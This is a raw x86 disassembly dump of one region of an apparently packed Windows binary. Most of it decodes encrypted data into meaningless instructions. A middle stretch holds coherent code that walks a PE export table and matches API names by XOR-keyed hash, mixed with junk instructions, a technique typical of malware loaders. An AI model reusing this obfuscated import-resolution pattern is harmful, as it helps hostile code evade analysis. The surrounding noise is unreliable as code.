  404758:	cwde   
  404759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40475a:	imul   eax,DWORD PTR [edx+0x14],0x10
  40475e:	pop    ss
  40475f:	push   ecx
  404760:	add    ch,BYTE PTR [edi]
  404762:	sar    DWORD PTR ds:0xb06c2327,cl
  404768:	mov    cl,0xfd
  40476a:	sub    BYTE PTR es:[eax+ebp*2],bh
  40476e:	or     al,ah
  404770:	dec    esp
  404771:	and    edi,DWORD PTR [edi+0x39c55952]
  404777:	mov    dh,BYTE PTR [edi+0x480f8993]
  40477d:	push   eax
  40477e:	mov    bl,0xea
  404780:	pop    ebp
  404781:	mov    al,0x84
  404783:	inc    edx
  404784:	dec    eax
  404785:	push   edi
  404786:	sbb    eax,0x950652b1
  40478b:	cmp    eax,0x285a24ee
  404790:	xchg   esi,eax
  404791:	push   eax
  404792:	and    al,BYTE PTR [ecx]
  404794:	jecxz  0x40474e
  404796:	dec    ebx
  404797:	cmp    BYTE PTR [edx],bh
  404799:	aas    
  40479a:	icebp  
  40479b:	push   esp
  40479c:	in     al,0x83
  40479e:	or     DWORD PTR [edx+esi*4-0x26],eax
  4047a2:	sub    dl,dl
  4047a4:	jns    0x404759
  4047a6:	mov    ah,0x9c
  4047a8:	leave  
  4047a9:	and    DWORD PTR [ecx+0x42df8262],0xffffffc5
  4047b0:	fdivr  QWORD PTR [ebx+esi*2-0x1d12be96]
  4047b7:	dec    ecx
  4047b8:	cwde   
  4047b9:	and    cl,BYTE PTR [edi]
  4047bb:	dec    esp
  4047bc:	xor    edx,DWORD PTR [edi]
  4047be:	(bad)  
  4047bf:	push   0xfffffffa
  4047c1:	xor    DWORD PTR [ecx+0x685b7a1e],eax
  4047c7:	call   0xe64:0xbf83aad3
  4047ce:	jnp    0x40482a
  4047d0:	cmp    al,BYTE PTR [edx+0x2b32b836]
  4047d6:	sbb    dl,BYTE PTR [esi+0x2647b7f]
  4047dc:	(bad)  
  4047dd:	mov    al,0x24
  4047df:	fmul   st,st(7)
  4047e1:	jb     0x40483d
  4047e3:	mov    ecx,DWORD PTR [ecx+edi*4-0x5f357afd]
  4047ea:	stos   BYTE PTR es:[edi],al
  4047eb:	outs   dx,DWORD PTR ds:[esi]
  4047ec:	xchg   esi,eax
  4047ed:	cmp    BYTE PTR [edx+0x63],al
  4047f0:	cmc    
  4047f1:	(bad)  
  4047f2:	mov    bl,0x8f
  4047f4:	pop    ds
  4047f5:	ja     0x4047c2
  4047f7:	and    BYTE PTR [ebx],0x21
  4047fa:	scas   al,BYTE PTR es:[edi]
  4047fb:	rcr    DWORD PTR [edi],0x67
  4047fe:	icebp  
  4047ff:	adc    ebx,DWORD PTR [ecx+eax*4-0x60d310a6]
  404806:	pop    ebx
  404807:	xor    ah,bh
  404809:	imul   ebx,DWORD PTR [esi],0x6dcfb2cd
  40480f:	xchg   ecx,eax
  404810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404811:	arpl   dx,bp
  404813:	adc    esp,DWORD PTR [ebp+0x70]
  404816:	inc    edx
  404817:	popa   
  404818:	xchg   ebx,eax
  404819:	daa    
  40481a:	fwait
  40481b:	(bad)  
  40481c:	lahf   
  40481d:	(bad)  
  40481e:	cld    
  40481f:	sub    DWORD PTR [edx+0x44],edx
  404822:	push   esi
  404823:	cmp    DWORD PTR [esp+eax*2-0xa020991],esp
  40482a:	aas    
  40482b:	add    BYTE PTR [eax+0x46],cl
  40482e:	inc    esi
  40482f:	sub    al,0x5a
  404831:	push   eax
  404832:	adc    eax,0xdd1a1a14
  404837:	out    dx,eax
  404838:	push   ebx
  404839:	adc    bl,BYTE PTR [ebp+ebp*4+0xf198fbe]
  404840:	or     DWORD PTR [edi],0xffffff88
  404843:	push   esp
  404844:	outs   dx,DWORD PTR ds:[esi]
  404845:	loopne 0x40485c
  404847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404848:	xchg   ebp,eax
  40484a:	add    ebx,edx
  40484c:	mov    eax,0xed84638c
  404851:	jnp    0x40485d
  404853:	push   ebp
  404854:	dec    edx
  404855:	sbb    DWORD PTR [edi+0x11],ecx
  404858:	out    dx,eax
  404859:	ficomp DWORD PTR [ebx+0x7c8eb513]
  40485f:	mov    DWORD PTR [eax-0x38],ebx
  404862:	mov    al,ds:0x1c89ef
  404867:	mov    bl,0x39
  404869:	dec    eax
  40486a:	inc    ebp
  40486b:	xchg   ecx,eax
  40486d:	and    al,0x84
  40486f:	and    eax,ecx
  404871:	cmc    
  404872:	mov    eax,ds:0x6247a965
  404877:	pop    eax
  404878:	inc    edx
  404879:	ins    BYTE PTR es:[edi],dx
  40487a:	std    
  40487b:	mov    ds:0x589a5565,al
  404880:	lods   al,BYTE PTR ds:[esi]
  404881:	iret   
  404882:	aam    0xdd
  404884:	sub    DWORD PTR [esi+0x25],ecx
  404887:	pop    ds
  404888:	mov    WORD PTR [esi-0x56523b04],gs
  40488e:	pop    ebx
  40488f:	pop    ss
  404890:	outs   dx,BYTE PTR ds:[esi]
  404891:	inc    ecx
  404892:	xor    al,0xe9
  404894:	mov    ds:0x8993e4cc,eax
  404899:	test   esi,esp
  40489b:	xchg   DWORD PTR [ecx+0x5355ea33],ecx
  4048a1:	mov    ch,BYTE PTR [esi-0x1e]
  4048a4:	pusha  
  4048a5:	xor    bh,BYTE PTR [edi+ecx*8+0x3d]
  4048a9:	pusha  
  4048aa:	rcl    edx,0x79
  4048ad:	ins    BYTE PTR es:[edi],dx
  4048ae:	mov    edx,0xa3c7db42
  4048b3:	(bad)  
  4048b4:	and    BYTE PTR [esi+0x4c227f96],dl
  4048ba:	sahf   
  4048bb:	ret    0x738
  4048be:	das    
  4048bf:	fimul  WORD PTR [ebx]
  4048c1:	out    dx,eax
  4048c2:	loope  0x404886
  4048c4:	push   eax
  4048c5:	xchg   edx,eax
  4048c6:	ror    eax,1
  4048c8:	dec    ecx
  4048c9:	pop    ds
  4048ca:	jge    0x404897
  4048cc:	add    cl,ah
  4048ce:	mov    ebx,0xc5048010
  4048d3:	jbe    0x404905
  4048d5:	shl    BYTE PTR [esi+0x75a351e5],0xd2
  4048dc:	xor    ah,BYTE PTR [ecx]
  4048de:	push   ds
  4048df:	in     eax,0xf0
  4048e1:	pop    es
  4048e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048e3:	xchg   esi,eax
  4048e4:	lahf   
  4048e5:	fs pop ebx
  4048e7:	sahf   
  4048e8:	pop    ss
  4048e9:	adc    DWORD PTR [ebx-0x186424c4],ecx
  4048ef:	in     eax,dx
  4048f0:	arpl   WORD PTR [ecx-0x1d],dx
  4048f3:	sahf   
  4048f4:	adc    al,0xb9
  4048f6:	gs aaa 
  4048f8:	push   es
  4048f9:	mov    ebx,0x6b9e4d71
  4048fe:	xchg   esp,eax
  4048ff:	ins    BYTE PTR es:[edi],dx
  404900:	xor    DWORD PTR [esi+edi*1+0x7c],edx
  404904:	imul   edi,DWORD PTR [edx+0x7e],0x34
  404908:	lahf   
  404909:	and    dl,ah
  40490b:	push   0xfffffffc
  40490d:	ja     0x4048c0
  40490f:	or     al,0x31
  404911:	cmp    al,0xb3
  404913:	jg     0x40492b
  404915:	pop    di
  404917:	sar    BYTE PTR [ebx+0x329882b0],0xe1
  40491e:	dec    edx
  40491f:	pushf  
  404920:	out    0x56,al
  404922:	adc    eax,0x85be4d71
  404927:	clc    
  404928:	mov    ebx,0xf5198d1
  40492d:	not    edi
  40492f:	mov    ds:0xae8a989a,eax
  404934:	into   
  404935:	fwait
  404936:	inc    edi
  404937:	jp     0x4048e1
  404939:	int3   
  40493a:	js     0x40497d
  40493c:	jo     0x404919
  40493e:	push   ebp
  40493f:	test   ebx,edx
  404941:	xor    BYTE PTR [ebx],ah
  404943:	push   ecx
  404944:	bound  ebx,QWORD PTR [eax-0x628a8dc1]
  40494a:	lock clc 
  40494c:	dec    esp
  40494d:	inc    esi
  40494e:	add    dl,BYTE PTR [eax-0x3]
  404951:	into   
  404952:	or     ebp,DWORD PTR [esp+ebp*2]
  404955:	and    BYTE PTR [ebp-0x12],ah
  404958:	fbld   TBYTE PTR [edx]
  40495a:	jmp    0x404942
  40495c:	aaa    
  40495d:	imul   edx,DWORD PTR [ebx-0x3],0xb73b7058
  404964:	mov    eax,ds:0x1ce45c31
  404969:	and    DWORD PTR [edi-0x7b],edx
  40496c:	sub    BYTE PTR [esi-0x65],ch
  40496f:	sbb    DWORD PTR [ebx+ebp*1],ebp
  404972:	mov    ds:0x650d3394,al
  404977:	add    al,0x28
  404979:	out    0x30,al
  40497b:	ja     0x4049b5
  40497d:	mov    bl,0x99
  40497f:	nop
  404980:	es xchg edi,eax
  404982:	sub    DWORD PTR [ecx],ecx
  404984:	dec    edi
  404985:	dec    edx
  404986:	mov    ah,0x4e
  404988:	pop    ecx
  404989:	cmp    ch,dh
  40498b:	adc    eax,DWORD PTR [edx-0x43ad0b5f]
  404991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404992:	out    dx,eax
  404993:	sbb    ebx,DWORD PTR [ebp-0x26]
  404996:	sbb    BYTE PTR ds:[esi+0x79],bl
  40499a:	adc    BYTE PTR [edx-0x6b927cdb],ah
  4049a0:	cmp    al,0xed
  4049a2:	rcr    cl,cl
  4049a4:	fisttp WORD PTR [edx]
  4049a6:	imul   BYTE PTR [eax-0x1f6c09c6]
  4049ac:	loopne 0x404a01
  4049ae:	or     BYTE PTR [eax],dh
  4049b0:	adc    ebx,DWORD PTR [edx-0x39]
  4049b3:	fsubp  st(7),st
  4049b5:	loopne 0x404988
  4049b7:	fmul   DWORD PTR [esi-0x54]
  4049ba:	and    edx,0x113eb44e
  4049c0:	dec    ebx
  4049c1:	push   eax
  4049c2:	cli    
  4049c3:	mov    dl,0x43
  4049c5:	bound  ebp,QWORD PTR [eax-0x28]
  4049c8:	out    0x20,al
  4049ca:	ret    
  4049cb:	dec    ecx
  4049cc:	and    al,0x63
  4049ce:	push   ebp
  4049cf:	jmp    0x15edb86e
  4049d4:	loopne 0x404a38
  4049d6:	in     al,dx
  4049d7:	mov    ch,0x28
  4049d9:	outs   dx,DWORD PTR ds:[esi]
  4049da:	addr16 icebp 
  4049dc:	repz loopne 0x404a26
  4049df:	and    edx,0x30e97f08
  4049e5:	sbb    edx,DWORD PTR [edi+0x34136a49]
  4049eb:	xor    DWORD PTR [ecx+0x7f7d9135],0x49a142b7
  4049f5:	mov    eax,ds:0x117b44f1
  4049fa:	pop    esi
  4049fb:	icebp  
  4049fc:	aas    
  4049fd:	push   es
  4049fe:	add    al,0xa0
  404a00:	rcl    BYTE PTR [ebx-0x5e],0xf8
  404a04:	mov    eax,ds:0x32e781b9
  404a09:	mov    ds:0x2d5cf7ff,al
  404a0e:	mov    eax,0xa335e7e8
  404a13:	ja     0x4049eb
  404a15:	cmc    
  404a16:	push   cs
  404a17:	arpl   WORD PTR [ebp+0x15868a09],cx
  404a1d:	out    0x11,al
  404a1f:	call   0x654c8478
  404a24:	xchg   DWORD PTR [edx],esi
  404a26:	pop    es
  404a27:	jge    0x404a2b
  404a29:	ins    BYTE PTR es:[edi],dx
  404a2a:	inc    esi
  404a2b:	bound  eax,QWORD PTR [esi+eiz*1-0x2b]
  404a2f:	add    BYTE PTR [esi+0x22236a68],al
  404a35:	jae    0x404a88
  404a37:	xchg   esp,eax
  404a38:	xchg   edi,eax
  404a39:	cdq    
  404a3a:	enter  0x86e2,0xca
  404a3e:	test   ah,al
  404a40:	jmp    0x435c1ecf
  404a45:	mov    esp,0x2728f498
  404a4a:	fisubr WORD PTR [ecx+esi*2-0x79]
  404a4e:	das    
  404a4f:	imul   esp,DWORD PTR [ebp-0x62b4bfce],0x4d
  404a56:	xchg   ecx,eax
  404a57:	pop    edx
  404a58:	add    al,0xd
  404a5a:	cmp    al,0x7d
  404a5c:	lock push ecx
  404a5e:	cmp    al,0x86
  404a60:	loopne 0x404a21
  404a62:	sub    cl,BYTE PTR [ebx-0x69049cab]
  404a68:	pop    esi
  404a69:	and    edi,DWORD PTR [ecx+eax*2]
  404a6c:	sti    
  404a6d:	hlt    
  404a6e:	or     DWORD PTR [ebp+0x79b8693e],esp
  404a74:	jmp    0xd7e9:0x67ef6390
  404a7b:	and    eax,0x410a988a
  404a80:	or     dl,dl
  404a82:	and    DWORD PTR [ecx+esi*1-0x29588c75],0x382702e3
  404a8d:	in     eax,0x28
  404a8f:	mov    al,0x1
  404a91:	daa    
  404a92:	in     eax,dx
  404a93:	cmp    DWORD PTR [ebx],ecx
  404a95:	mov    ch,0x25
  404a97:	sbb    eax,0x3f7f2988
  404a9c:	mov    ch,0x4f
  404a9e:	pop    edi
  404a9f:	in     al,0xdc
  404aa1:	jmp    DWORD PTR [ebp-0x5f]
  404aa4:	inc    esi
  404aa5:	xor    DWORD PTR [ecx],ebp
  404aa7:	mov    ecx,0x3b822a53
  404aac:	push   esi
  404aad:	je     0x404af8
  404aaf:	dec    esp
  404ab0:	mov    ds:0x57613521,eax
  404ab5:	ja     0x404b19
  404ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ab8:	push   ds
  404ab9:	scas   eax,DWORD PTR es:[edi]
  404aba:	in     al,dx
  404abb:	push   ebp
  404abc:	mov    esp,0x8a1ddbdc
  404ac1:	pop    esp
  404ac2:	add    BYTE PTR [edx+0x5fa2a473],bh
  404ac8:	or     DWORD PTR [esi-0x5e3ed91d],esp
  404ace:	xchg   ah,cl
  404ad0:	fs pop ebp
  404ad2:	inc    ecx
  404ad3:	das    
  404ad4:	dec    ebp
  404ad5:	xchg   DWORD PTR [eax+0x42e88482],ebp
  404adb:	jp     0x404b48
  404add:	test   eax,0x91df3f7e
  404ae2:	adc    eax,0xbbc6482f
  404ae7:	mov    ah,0xe1
  404ae9:	jb     0x404a7b
  404aeb:	(bad)  
  404aec:	add    DWORD PTR ss:[esi+0x3c80c5f2],edx
  404af3:	push   esp
  404af4:	out    0xd5,eax
  404af6:	xor    ebx,DWORD PTR [esi+0xb8cd6f6]
  404afc:	inc    esi
  404afd:	mov    al,0xa2
  404aff:	ins    DWORD PTR es:[edi],dx
  404b00:	sub    al,0x3c
  404b02:	popf   
  404b03:	pushf  
  404b04:	mov    ebp,0x44e1e7c6
  404b09:	and    eax,0x3edfb6f4
  404b0e:	xor    BYTE PTR ds:0x5722e85,dh
  404b14:	es mov ecx,0xd05a8bee
  404b1a:	retf   
  404b1b:	jmp    0x404b47
  404b1d:	stc    
  404b1e:	adc    al,0xb8
  404b20:	repnz test ebx,0x1a888b9e
  404b27:	pusha  
  404b28:	pushf  
  404b29:	xchg   ebp,ebx
  404b2b:	dec    ebx
  404b2c:	push   ds
  404b2d:	inc    esi
  404b2e:	out    dx,eax
  404b2f:	imul   ebx,DWORD PTR [edi],0x7
  404b32:	adc    BYTE PTR [edx+0x6c272584],0xd1
  404b39:	dec    esi
  404b3a:	in     al,0x76
  404b3c:	sbb    BYTE PTR [esi-0x7f],dl
  404b3f:	in     eax,dx
  404b40:	loop   0x404b02
  404b42:	xor    al,dh
  404b44:	call   0xd8f5:0x84723e1c
  404b4b:	mov    ecx,0x4d1b338c
  404b50:	or     al,0x99
  404b52:	jne    0x404ae4
  404b54:	les    ebx,FWORD PTR [edi+0x61e1a240]
  404b5a:	mov    BYTE PTR [ecx],bl
  404b5c:	sub    al,BYTE PTR [esi]
  404b5e:	mov    edi,0xc63b7fc4
  404b63:	aad    0xdb
  404b65:	xchg   esp,eax
  404b66:	xor    ch,ah
  404b68:	out    dx,al
  404b69:	jmp    0xa81bc739
  404b6e:	and    eax,ecx
  404b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b71:	fs and al,0x3e
  404b74:	adc    edi,ebx
  404b76:	mov    edx,0x31eb7333
  404b7b:	or     eax,0x2ca5dd7
  404b80:	push   ebx
  404b81:	cmp    ch,dh
  404b83:	int    0x6c
  404b85:	ret    0x6cdc
  404b88:	dec    edx
  404b89:	xlat   BYTE PTR ds:[ebx]
  404b8a:	in     eax,0xa
  404b8c:	mov    esi,0xece99857
  404b91:	xchg   DWORD PTR [eax+0x5653abb8],ebp
  404b97:	in     eax,0x76
  404b99:	push   ss
  404b9a:	push   edx
  404b9b:	or     DWORD PTR [edx-0x45649ac3],esp
  404ba1:	neg    DWORD PTR [eax-0x79411e39]
  404ba7:	fbstp  TBYTE PTR [edi]
  404ba9:	ror    ebp,1
  404bab:	das    
  404bac:	xchg   ecx,eax
  404bad:	lea    esi,[esi]
  404baf:	push   edi
  404bb0:	fbstp  TBYTE PTR [ebp+0x21]
  404bb3:	neg    DWORD PTR [esi-0x4a]
  404bb6:	xor    BYTE PTR [ecx],cl
  404bb8:	adc    DWORD PTR [esi+0x2fb8c6a0],0x7da326bc
  404bc2:	sub    eax,0x3b5908c9
  404bc7:	stc    
  404bc8:	dec    dh
  404bca:	push   0xfffffff8
  404bcc:	les    esp,FWORD PTR [eax+ecx*8-0x62]
  404bd0:	dec    ebx
  404bd1:	out    dx,al
  404bd2:	fsubp  st(4),st
  404bd4:	adc    eax,0x61e2051c
  404bd9:	or     al,0x7f
  404bdb:	sub    DWORD PTR [eax],esi
  404bdd:	add    edi,DWORD PTR ds:0xa3dbc5ed
  404be3:	dec    ebp
  404be4:	fdiv   st,st(2)
  404be6:	rol    ebp,cl
  404be8:	pop    ds
  404be9:	mov    ebp,DWORD PTR [ecx-0x69]
  404bec:	ins    DWORD PTR es:[edi],dx
  404bed:	add    bh,BYTE PTR [esi+0x1655d426]
  404bf3:	mov    ebx,0xaeedaa69
  404bf8:	cdq    
  404bf9:	call   0x4343acdb
  404bfe:	jg     0x404b8f
  404c00:	jmp    0x7ff3d8ff
  404c05:	mov    ds:0xb0ae5a20,eax
  404c0a:	in     al,dx
  404c0b:	retf   0x829c
  404c0e:	retf   0xda80
  404c11:	and    al,0x69
  404c13:	xchg   edx,eax
  404c14:	mov    dh,0x1e
  404c16:	or     ch,bl
  404c18:	jecxz  0x404c8c
  404c1a:	or     eax,0xfdfcce1d
  404c1f:	jge    0x404c73
  404c21:	xchg   esp,eax
  404c22:	sahf   
  404c23:	jbe    0x404c61
  404c25:	pop    edi
  404c26:	mov    cl,0xd
  404c28:	lahf   
  404c29:	push   cx
  404c2b:	clc    
  404c2c:	out    dx,eax
  404c2d:	in     al,dx
  404c2e:	mov    al,0x5f
  404c30:	pushf  
  404c31:	inc    ecx
  404c32:	sbb    ch,BYTE PTR [ecx+0x32fb1ec4]
  404c38:	or     DWORD PTR [edi],ebx
  404c3a:	adc    BYTE PTR [ecx],bh
  404c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c3e:	pop    ebx
  404c3f:	gs stos DWORD PTR es:[edi],eax
  404c41:	ds fucomi st,st(3)
  404c44:	mov    edi,0x55b77414
  404c49:	fcomp  QWORD PTR [esi]
  404c4b:	scas   al,BYTE PTR es:[edi]
  404c4c:	sbb    dh,BYTE PTR [ebp-0x39947f4a]
  404c52:	pop    ebp
  404c53:	sahf   
  404c54:	push   edx
  404c55:	mov    eax,DWORD PTR ss:[ebp-0x4]
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	sub    eax,0xa3daa2c
  404e9b:	pop    edi
  404e9c:	jp     0x404f18
  404e9e:	or     bl,BYTE PTR [edi+0x7a]
  404ea1:	jp     0x404e69
  404ea3:	push   edi
  404ea4:	mov    edx,0xfee509eb
  404ea9:	pop    ebp
  404eaa:	iret   
  404eab:	mov    al,0x30
  404ead:	test   BYTE PTR [ecx],al
  404eaf:	shl    esp,1
  404eb1:	arpl   WORD PTR [edx],si
  404eb3:	xchg   edi,eax
  404eb4:	mov    ds:0x86144b0a,al
  404eb9:	adc    eax,0x21ba956b
  404ebe:	pop    edx
  404ebf:	mov    esp,0xfabaf47c
  404ec4:	adc    ebx,DWORD PTR [eax]
  404ec6:	loope  0x404e8d
  404ec8:	or     edx,DWORD PTR [eax]
  404eca:	fist   DWORD PTR [edi+0x14c55bad]
  404ed0:	sub    BYTE PTR ds:0xbc6517c5,cl
  404ed6:	call   0x9733:0xc32de0f7
  404edd:	add    DWORD PTR [ebx+edi*1],ebx
  404ee0:	repnz fst DWORD PTR [ecx]
  404ee3:	mov    ebx,0xf304fa81
  404ee8:	or     al,0xcd
  404eea:	loop   0x404eed
  404eec:	adc    ch,bl
  404eee:	pusha  
  404eef:	push   esp
  404ef0:	jp     0x404f35
  404ef2:	les    ebx,FWORD PTR [eax-0x7f226803]
  404ef8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404efa:	xchg   esi,eax
  404efb:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  404efd:	pusha  
  404efe:	inc    ebp
  404eff:	xor    BYTE PTR [edx+0x8],bh
  404f02:	fwait
  404f03:	(bad)  
  404f04:	mov    cl,0xf0
  404f06:	aad    0x41
  404f08:	mov    dl,0x6f
  404f0a:	repz es loope 0x404f18
  404f0e:	xlat   BYTE PTR ds:[ebx]
  404f0f:	pop    edx
  404f10:	retf   
  404f11:	mov    cl,0x6b
  404f13:	push   ss
  404f14:	sbb    al,0x4d
  404f16:	cwde   
  404f17:	in     eax,dx
  404f18:	or     bl,bl
  404f1a:	outs   dx,DWORD PTR ds:[esi]
  404f1b:	jg     0x404f3e
  404f1d:	jae    0x404f1d
  404f1f:	or     DWORD PTR [ebp-0x6f],0xffffffbf
  404f23:	(bad)  
  404f24:	icebp  
  404f25:	pop    ds
  404f26:	dec    edx
  404f27:	imul   ebx,DWORD PTR [ecx-0xd],0x866ca03d
  404f2e:	sub    al,0x48
  404f30:	lahf   
  404f31:	cmc    
  404f32:	dec    ebx
  404f33:	lds    ecx,FWORD PTR [edx]
  404f35:	pop    edi
  404f36:	push   es
  404f37:	cs pop edx
  404f39:	(bad)  
  404f3a:	shl    dl,cl
  404f3c:	mov    dh,0xdb
  404f3e:	jae    0x404f2e
  404f40:	fs (bad) 
  404f42:	push   es
  404f43:	xor    BYTE PTR [edi+ecx*1+0x684bcf4d],dl
  404f4a:	mov    bl,0xf8
  404f4c:	test   DWORD PTR [edx-0x7d],ebp
  404f4f:	sbb    esp,ebx
  404f51:	mov    bl,0x27
  404f53:	mov    ds:0x582227e0,al
  404f58:	push   ss
  404f59:	or     eax,0xa03f5cf5
  404f5e:	cmp    DWORD PTR [eax+0x2c],ecx
  404f61:	xchg   edi,eax
  404f62:	sbb    bh,dh
  404f64:	js     0x404f4e
  404f66:	sub    ebx,DWORD PTR [edi+0x12b75f1d]
  404f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f6d:	mov    cl,0xaa
  404f6f:	mov    esi,edx
  404f71:	jmp    0x404f01
  404f73:	push   ebx
  404f74:	mov    ch,BYTE PTR [ebp-0x4a]
  404f77:	cmp    BYTE PTR [ebx+edx*1-0x497785f9],dh
